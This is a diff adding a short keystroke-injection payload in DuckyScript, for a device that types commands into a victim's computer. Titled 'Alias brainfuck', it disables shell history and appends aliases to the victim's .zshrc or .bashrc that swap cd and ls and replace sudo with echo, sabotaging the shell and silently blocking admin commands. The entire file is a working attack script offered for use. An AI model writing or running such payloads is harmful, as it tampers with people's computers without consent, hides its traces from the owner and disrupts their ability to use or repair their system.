@@ -1,0 +1,22 @@
+REM TITLE Alias brainfuck
+REM AUTHOR Saverio976
+REM DESCRIPTION messed up with alias
+
+STRINGLN : : : : : : : : : : : : : : : : : : : : : : :
+STRINGLN [[ "$SHELL" == *"zsh"* ]] && zsh
+STRINGLN [[ "$SHELL" == *"bash"* ]] && bash
+
+STRINGLN cd
+
+STRINGLN [[ "$SHELL" == *"zsh"* ]] && unset HISTFILE
+STRINGLN [[ "$SHELL" == *"bash"* ]] && set +o history
+
+STRINGLN [[ "$SHELL" == *"zsh"* ]] && CONFIG_FILE="${ZDOTDIR:-$HOME}/.zshrc"
+STRINGLN [[ "$SHELL" == *"bash"* ]] && CONFIG_FILE=".bashrc"
+STRINGLN echo "" >> $CONFIG_FILE
+STRINGLN echo "alias cd=/usr/bin/ls" >> $CONFIG_FILE
+STRINGLN echo "alias ls=cd" >> $CONFIG_FILE
+STRINGLN echo "alias sudo=echo" >> $CONFIG_FILE
+
+STRINGLN exit
+ATTACKMODE STORAGE
